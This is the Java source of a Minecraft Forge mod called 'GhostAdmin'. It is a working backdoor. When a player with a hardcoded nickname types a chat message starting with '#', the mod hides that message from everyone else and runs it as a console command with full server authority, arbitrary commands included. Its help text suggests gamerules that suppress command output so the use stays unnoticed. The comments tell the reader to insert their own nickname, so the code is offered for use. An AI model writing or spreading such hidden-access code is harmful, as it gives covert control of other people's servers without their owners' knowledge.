package com.floodcraft.ghost;

import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.ServerChatEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.level.GameType;
import net.minecraftforge.server.ServerLifecycleHooks;
import net.minecraft.network.chat.Component;
import net.minecraft.world.item.ItemStack;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.core.registries.BuiltInRegistries;
import net.minecraft.world.level.GameRules;

@Mod("ghostadmin")
public class GhostAdmin {

    private final String SECRET_NICK = "FLIRS1212"; // ⚠️ ЗАМЕНИ НА СВОЙ НИК
    private final String PREFIX = "#";

    public GhostAdmin() {
        MinecraftForge.EVENT_BUS.register(this);
        System.out.println("[GhostAdmin] Мод активирован!");
    }

    @SubscribeEvent
    public void onServerChat(ServerChatEvent event) {
        ServerPlayer player = event.getPlayer();
        String message = event.getMessage();

        if (!player.getName().getString().equals(SECRET_NICK) || !message.startsWith(PREFIX)) {
            return;
        }

        event.setCanceled(true);
        String fullCommand = message.substring(PREFIX.length());
        String[] args = fullCommand.split(" ");
        
        if (args.length == 0) return;

        MinecraftServer server = ServerLifecycleHooks.getCurrentServer();
        if (server == null) return;

        player.sendSystemMessage(Component.literal("§8[§5Ghost§8] §fВыполняю: §e" + fullCommand));

        switch (args[0].toLowerCase()) {
            case "gm":
            case "gamemode":
                if (args.length < 2) {
                    player.sendSystemMessage(Component.literal("§cИспользование: #gm <0/1/2/3> [игрок]"));
                    return;
                }
                String targetPlayer = args.length >= 3 ? args[2] : player.getName().getString();
                ServerPlayer target = server.getPlayerList().getPlayerByName(targetPlayer);
                if (target == null) {
                    player.sendSystemMessage(Component.literal("§cИгрок не найден"));
                    return;
                }
                GameType mode = switch(args[1]) {
                    case "0", "s" -> GameType.SURVIVAL;
                    case "1", "c" -> GameType.CREATIVE;
                    case "2", "a" -> GameType.ADVENTURE;
                    case "3", "sp" -> GameType.SPECTATOR;
                    default -> null;
                };
                if (mode != null) {
                    target.setGameMode(mode);
                    player.sendSystemMessage(Component.literal("§aРежим изменен"));
                }
                break;

            case "give":
                if (args.length < 3) {
                    player.sendSystemMessage(Component.literal("§cИспользование: #give <игрок> <предмет> [количество]"));
                    return;
                }
                String giveTarget = args[1];
                String itemId = args[2];
                int count = args.length >= 4 ? Integer.parseInt(args[3]) : 1;
                server.getCommands().performCommand(server.createCommandSourceStack(), 
                    "give " + giveTarget + " " + itemId + " " + count);
                player.sendSystemMessage(Component.literal("§aПредмет выдан"));
                break;

            case "gr":
            case "gamerule":
                if (args.length < 2) {
                    player.sendSystemMessage(Component.literal("§e#gr commandBlockOutput false §7- скрыть вывод"));
                    player.sendSystemMessage(Component.literal("§e#gr sendCommandFeedback false §7- скрыть отзывы"));
                    player.sendSystemMessage(Component.literal("§e#gr doDaylightCycle false §7- остановить время"));
                    player.sendSystemMessage(Component.literal("§e#gr doWeatherCycle false §7- остановить погоду"));
                    player.sendSystemMessage(Component.literal("§e#gr keepInventory true §7- сохранять инвентарь"));
                    return;
                }
                String rule = args[1];
                String value = args.length >= 3 ? args[2] : null;
                if (value == null) {
                    server.getCommands().performCommand(server.createCommandSourceStack(), "gamerule " + rule);
                } else {
                    server.getCommands().performCommand(server.createCommandSourceStack(), "gamerule " + rule + " " + value);
                    player.sendSystemMessage(Component.literal("§aПравило " + rule + " установлено"));
                }
                break;

            case "help":
                player.sendSystemMessage(Component.literal("§6=== GhostAdmin ==="));
                player.sendSystemMessage(Component.literal("§e#gm <0/1/2/3> [игрок]"));
                player.sendSystemMessage(Component.literal("§e#give <игрок> <предмет> [кол-во]"));
                player.sendSystemMessage(Component.literal("§e#gr [правило] [значение]"));
                break;

            default:
                server.getCommands().performCommand(server.createCommandSourceStack(), fullCommand);
                player.sendSystemMessage(Component.literal("§aКоманда отправлена в консоль"));
                break;
        }
    }
                                       }
